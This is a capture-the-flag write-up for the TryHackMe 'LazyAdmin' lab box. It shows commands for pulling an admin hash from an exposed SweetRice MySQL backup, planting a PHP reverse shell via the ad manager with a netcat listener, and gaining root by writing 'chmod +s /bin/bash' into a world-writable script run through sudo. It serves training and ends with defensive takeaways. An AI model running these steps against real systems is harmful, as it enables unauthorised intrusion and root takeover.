# 🦥 LazyAdmin: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `lazyadmin.thm` |
| **OS** | Ubuntu |
| **Attack Surface** | SweetRice CMS — MySQL backup exposes admin hash → authenticated PHP reverse shell via ad manager |
| **Privesc** | `sudo perl backup.pl` → world-writable `/etc/copy.sh` → SUID bash → root |

LazyAdmin runs SweetRice CMS with a publicly accessible MySQL backup file containing the admin password hash. After cracking it and logging into the admin panel, a PHP reverse shell is planted via the ad manager. On the box, `www-data` can run a Perl script as root via sudo — that script calls a world-writable shell script, allowing arbitrary command injection.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 lazyadmin.thm
```

```
22/tcp open  ssh    OpenSSH 7.2p2
80/tcp open  http   Apache 2.4.18 (Ubuntu)
```

### Directory Bruteforce

Notable hit: `/content/` — the SweetRice CMS install. The MySQL backup directory is web-accessible:

```
/content/inc/mysql_backup/
```

### MySQL Backup — Hash Extraction

```bash
wget http://lazyadmin.thm/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
grep -i passwd mysql_bakup_20191129023059-1.5.1.sql
```

```
s:5:"admin";s:7:"manager";s:6:"passwd";s:32:"42f749ade7f9e195bf475f37a44cafcb"
```

Hash cracked via CrackStation:

```
42f749ade7f9e195bf475f37a44cafcb → Password123
```

Credentials: `manager:Password123`

---

## 💀 Initial Access — SweetRice PHP Reverse Shell

Logged in at `http://lazyadmin.thm/content/as/` with `manager:Password123`.

SweetRice's ad manager allows creating "advertisements" with arbitrary content. A PHP reverse shell from [revshells.com](https://www.revshells.com/) (PHP PentestMonkey) was planted as an ad, then triggered by visiting the ad URL:

```
# Create ad at:
http://lazyadmin.thm/content/as/?type=ad

# Trigger shell:
http://lazyadmin.thm/content/?action=ads&adname=test11223344
```

```bash
nc -nlvp 4444
# Connection received — shell as www-data
```

---

## 🔁 Privilege Escalation — www-data → root

### sudo Enumeration

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

### Exploit Chain

`backup.pl` calls `/etc/copy.sh`, which is world-writable:

```bash
cat /home/itguy/backup.pl
# system("sh", "/etc/copy.sh");

ls -lah /etc/copy.sh
# -rw-r--rwx 1 root root 81 Nov 29 2019 /etc/copy.sh
```

Overwrote `copy.sh` with a payload to SUID `/bin/bash`, then triggered it via sudo:

```bash
echo 'chmod +s /bin/bash' > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

```bash
ls -lah /bin/bash
# -rwsr-sr-x 1 root root 1.1M /bin/bash

/bin/bash -p
# bash-4.4# id
# uid=33(www-data) euid=0(root)
```

---

## 🗺️ Attack Chain

```
[SweetRice — /content/inc/mysql_backup/]
    MySQL backup → admin hash → Password123
    Login as manager → ad manager → PHP reverse shell → www-data
          │
          ▼
[sudo perl backup.pl — NOPASSWD]
    backup.pl calls /etc/copy.sh
    copy.sh is world-writable → inject "chmod +s /bin/bash"
    sudo triggers → SUID bash → /bin/bash -p → root
```

---

## 📌 Key Takeaways

- Database backup files in a web-accessible directory are a direct credential leak; backups should never be stored under webroot
- SweetRice's ad manager executes arbitrary PHP — any CMS feature that saves user-controlled content to a PHP-executed file is a potential RCE vector
- World-writable scripts called by root-owned sudo commands are an instant privesc; audit file permissions on anything in a sudoers entry
- `sudo` entries for interpreters (`perl`, `python`, `bash`) with script arguments should be treated as shell access — the script's dependencies matter as much as the binary itself
